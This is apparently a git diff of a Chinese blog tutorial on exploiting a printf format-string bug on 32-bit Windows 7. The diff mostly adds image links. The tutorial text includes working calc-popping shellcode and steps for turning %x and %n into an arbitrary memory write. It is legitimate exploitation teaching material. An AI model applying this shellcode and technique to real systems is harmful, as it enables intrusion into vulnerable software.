@@ -49,22 +49,22 @@ int main (int argc, char *argv[])
 %x：依次打印出栈上数据
 ![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/1.png)
 %100x：指定数据打印时显示长度为100字节
-[图片]
+![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/2.png)
 %n：打印出栈上数据作为地址时，该地址的内容（当该地址不可达时，就会崩溃）
 
 ##### **2. 设置immunity debugger为默认调试器**
 直接在注册表里修改，该方法比较简单粗暴
-[图片]
-[图片]
+![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/3.png)
+![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/4.png)
 (PS：同样方法，win7下设置Ollydbg为默认调试器一直失败，但是设置immunityDbg为默认调试器则可以，不知道为什么)
 
 ##### **3. windows7_32bit 弹计算器shellcode**
-```
+```c++
 shellcode = '\xeb\x54\x31\xf6\x64\x8b\x76\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x6e\x08\x8b\x36\x8b\x5d\x3c\x8b\x5c\x1d\x78\x85\xdb\x74\xf0\x01\xeb\x8b\x4b\x18\x67\xe3\xe8\x8b\x7b\x20\x01\xef\x8b\x7c\x8f\xfc\x01\xef\x31\xc0\x99\x02\x17\xc1\xca\x04\xae\x75\xf8\x3b\x54\x24\x04\xe0\xe4\x75\xca\x8b\x53\x24\x01\xea\x0f\xb7\x14\x4a\x8b\x7b\x1c\x01\xef\x03\x2c\x97\xc3\x68\xe7\xc4\xcc\x69\xe8\xa2\xff\xff\xff\x50\x68\x63\x61\x6c\x63\x8b\xd4\x40\x50\x52\xff\xd5\x68\x77\xa6\x60\x2a\xe8\x8b\xff\xff\xff\x50\xff\xd5'
 ```
 
 ##### **4.  如何调试shellcode**
-```
+```c++
 #include "stdafx.h"
 #include<stdio.h>
 #include<windows.h>
@@ -88,19 +88,19 @@ int main(int argc, char* argv[])
 ##### **5. 查看程序开启安全机制**
 
 在immunity Debugger中，使用 
-```
+```python
 !mona modules
 ```
 可以查看程序加载的各个模块对应开启的安全机制
-[图片]
+![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/5.png)
 上图可见，对于程序本身什么安全机制都没开启。因为程序没有开启数据执行保护DEP，所以可以把shellcode放在栈上，攻击返回地址后跳转到shellcode处执行。
 
 
 ### 三. 漏洞调试
 首先使用'%x-%x-%x-%n'作为printf函数的唯一参数，此时崩溃现场如图
-[图片]
+![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/6.png)
 使用'%x-%x-%x-%x-%n'作为printf函数的唯一参数，此时崩溃现场如图
-[图片]
+![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/7.png)
 从上面两次尝试中可以看出，程序崩溃是因为'%n'这个参数，在
 ```
 mov ptr[EAX], ECX
@@ -112,7 +112,7 @@ mov ptr[EAX], ECX
 %x-%x-%x-%x-%n --> ECX：0x16=22
 ```
 对比下图，可以验证说法正确性
-[图片]
+![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/8.png)
 
 ### 四. 漏洞利用
 我们可以通过控制打印栈上内容的数量（即增加%x的数量），控制EAX的值。可以通过控制打印字符的长度（用%100x，%200x等来控制打印长度），控制ECX的值。最后利用mov ptr[EAX],ECX来任意地址写。
